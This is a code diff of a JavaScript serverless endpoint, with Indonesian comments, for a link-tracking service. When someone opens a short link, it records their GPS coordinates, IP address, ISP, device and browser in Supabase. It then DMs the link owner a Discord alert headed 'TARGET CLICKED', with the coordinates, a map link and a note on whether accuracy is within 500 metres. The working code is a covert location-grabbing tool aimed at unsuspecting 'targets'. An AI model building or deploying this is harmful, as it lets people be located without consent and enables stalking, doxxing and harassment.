@@ -1,11 +1,11 @@
-// api/track-location.js - Menerima data GPS dari client (Versi DM)
 import { createClient } from '@supabase/supabase-js';
 
 const supabase = createClient(
-  process.env.SUPABASE_URL,
-  process.env.SUPABASE_KEY
+  process.env.Supabase_URL || process.env.NEXT_PUBLIC_SUPABASE_URL,
+  process.env.Supabase_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
 );
-const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
+
+const DISCORD_BOT_TOKEN = process.env.Discord_BOT_TOKEN || process.env.DISCORD_BOT_TOKEN;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -19,32 +19,26 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'shortId required' });
     }
 
-    // Ambil data link + user_id
-    const { data: linkData, error: linkErr } = await supabase
+    // Ambil data link
+    const { data: linkData } = await supabase
       .from('links')
       .select('user_id, target_url')
       .eq('short_id', shortId)
       .single();
 
-    if (linkErr || !linkData) {
-      return res.status(404).json({ error: 'Link not found' });
-    }
-
-    // Dapatkan IP & Device
+    // IP & Device
     const forwarded = req.headers['x-forwarded-for'];
     const ip = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1');
     const rawAgent = req.headers['user-agent'] || 'Unknown Device';
 
-    // Parse Browser
     let browserName = "Unknown";
     if (rawAgent.includes("Chrome") && !rawAgent.includes("Edg")) browserName = "Google Chrome";
     else if (rawAgent.includes("Edg")) browserName = "Microsoft Edge";
     else if (rawAgent.includes("Safari") && !rawAgent.includes("Chrome")) browserName = "Safari";
     else if (rawAgent.includes("Firefox")) browserName = "Mozilla Firefox";
-    else if (rawAgent.includes("Opera") || rawAgent.includes("OPR")) browserName = "Opera";
 
-    const isMobile = rawAgent.includes("Mobile") || rawAgent.includes("Android") || rawAgent.includes("iPhone") || rawAgent.includes("iPad");
-    const deviceType = isMobile ? "📱 Smartphone/Tablet" : "💻 PC / Laptop";
+    const isMobile = rawAgent.includes("Mobile") || rawAgent.includes("Android") || rawAgent.includes("iPhone");
+    const deviceType = isMobile ? "📱 Smartphone" : "💻 PC / Laptop";
 
     // IP Geolocation (fallback)
     let ipGeo = { city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown ISP', lat: '', lon: '' };
@@ -63,15 +57,11 @@ export default async function handler(req, res) {
           };
         }
       }
-    } catch (e) {
-      console.error('IP Geolocation error:', e);
-    }
+    } catch (e) {}
 
-    // GPS Data
     const hasGPS = gps && gps.lat && gps.lon;
     const locationMethod = hasGPS ? 'GPS' : 'IP';
 
-    // Buat Google Maps link
     let mapLink = 'N/A';
     if (hasGPS && gps) {
       mapLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
@@ -80,11 +70,11 @@ export default async function handler(req, res) {
     }
 
     // Simpan ke Supabase
-    const { error: insertErr } = await supabase
+    await supabase
       .from('location_logs')
       .insert([{
         short_id: shortId,
-        user_id: linkData.user_id,
+        user_id: linkData?.user_id || null,
         ip_address: ip,
         browser: browserName,
         device: deviceType,
@@ -99,11 +89,7 @@ export default async function handler(req, res) {
         timestamp: timestamp || new Date().toISOString()
       }]);
 
-    if (insertErr) {
-      console.error('Supabase insert error:', insertErr);
-    }
-
-    // Update click count di links
+    // Update click count
     try {
       const { data: clickData } = await supabase
         .from('links')
@@ -118,12 +104,10 @@ export default async function handler(req, res) {
           last_click_at: new Date().toISOString()
         })
         .eq('short_id', shortId);
-    } catch (e) {
-      console.error('Update click count error:', e);
-    }
+    } catch (e) {}
 
-    // 🔥 KIRIM DM KE DISCORD (SAMA SEPERTI KODE ASLI)
-    if (linkData.user_id && DISCORD_BOT_TOKEN) {
+    // Kirim DM Discord
+    if (linkData?.user_id && DISCORD_BOT_TOKEN) {
       await sendDiscordDM(linkData.user_id, {
         shortId,
         ip,
@@ -133,20 +117,14 @@ export default async function handler(req, res) {
         browser: browserName,
         target: linkData.target_url,
         mapLink,
-        // Data GPS tambahan
         hasGPS,
         gpsLat: gps?.lat,
         gpsLon: gps?.lon,
-        gpsAccuracy: gps?.accuracy,
-        timestamp: timestamp || new Date().toISOString()
+        gpsAccuracy: gps?.accuracy
       });
     }
 
-    return res.status(200).json({
-      success: true,
-      method: locationMethod,
-      accuracy: gps?.accuracy || 'IP-based (low accuracy)'
-    });
+    return res.status(200).json({ success: true });
 
   } catch (error) {
     console.error('Error:', error);
@@ -154,12 +132,8 @@ export default async function handler(req, res) {
   }
 }
 
-// ============================================
-// FUNGSI DM DISCORD (SAMA PERSIS DENGAN KODE ASLI)
-// ============================================
 async function sendDiscordDM(userId, data) {
   try {
-    // 1. Buat DM Channel
     const channelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
       method: 'POST',
       headers: {
@@ -170,64 +144,47 @@ async function sendDiscordDM(userId, data) {
     });
 
     const channel = await channelRes.json();
-    if (!channel.id) {
-      console.error('Gagal buat DM channel:', channel);
-      return;
-    }
+    if (!channel.id) return;
 
-    // 2. Siapkan Embed
     const embed = {
       title: data.hasGPS ? "🚨 TARGET CLICKED - GPS PRESISI! 🚨" : "🚨 TARGET CLICKED - IP ONLY",
       color: data.hasGPS ? 0x00ff00 : 0xffaa00,
       fields: [
         { name: "🔗 Short ID", value: `\`${data.shortId}\``, inline: true },
         { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
-        { name: "📡 ISP / Provider", value: data.org || 'Unknown', inline: true },
+        { name: "📡 ISP", value: data.org || 'Unknown', inline: true },
         { name: "📍 Lokasi IP", value: data.location || 'Unknown', inline: false },
         { name: "🖥️ Perangkat", value: data.device, inline: true },
         { name: "🌐 Browser", value: data.browser, inline: true },
         { name: "🎯 Target URL", value: data.target, inline: false },
         { name: "🗺️ Google Maps", value: `[Buka Peta](${data.mapLink})`, inline: false }
       ],
-      timestamp: new Date().toISOString(),
-      footer: {
-        text: data.hasGPS ? `✅ Akurasi GPS: ±${Math.round(data.gpsAccuracy)} meter (PRESISI!)` : '⚠️ IP geolocation (akurasi rendah)'
-      }
+      timestamp: new Date().toISOString()
     };
 
-    // Tambahkan field GPS jika ada
     if (data.hasGPS && data.gpsLat && data.gpsLon) {
-      embed.fields.splice(5, 0, 
-        { 
-          name: "📍 GPS Location (PRESISI)", 
-          value: `Lat: ${data.gpsLat}\nLon: ${data.gpsLon}\nAkurasi: ±${Math.round(data.gpsAccuracy)} meter`,
-          inline: false 
-        }
-      );
-      
-      // Tandai apakah dalam radius 500m
-      const isWithinRadius = data.gpsAccuracy < 500;
-      embed.fields.push({
-        name: "🎯 Target Radius 500m",
-        value: isWithinRadius ? '✅ **TERCAPAI!** Lokasi dalam radius 500m' : `❌ **${Math.round(data.gpsAccuracy)}m** (melebihi target)`,
-        inline: true
+      embed.fields.splice(5, 0, {
+        name: "📍 GPS Location (PRESISI)",
+        value: `Lat: ${data.gpsLat}\nLon: ${data.gpsLon}\nAkurasi: ±${Math.round(data.gpsAccuracy)} meter`,
+        inline: false
       });
+      embed.footer = {
+        text: data.gpsAccuracy < 500 ? '✅ PRESISI! Lokasi dalam radius 500m' : `⚠️ ${Math.round(data.gpsAccuracy)}m (melebihi target)`
+      };
+    } else {
+      embed.footer = {
+        text: '⚠️ IP geolocation (akurasi rendah 50-100km)'
+      };
     }
 
-    // 3. Kirim Pesan
     await fetch(`https://discord.com/api/v10/channels/${channel.id}/messages`, {
       method: 'POST',
       headers: {
         'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ 
-        embeds: [embed],
-        content: data.hasGPS ? '@here 📍 **LOKASI PRESISI DITEMUKAN!**' : undefined
-      })
+      body: JSON.stringify({ embeds: [embed] })
     });
-
-    console.log(`✅ DM terkirim ke user ${userId}`);
 
   } catch (e) {
     console.error("DM Error:", e);
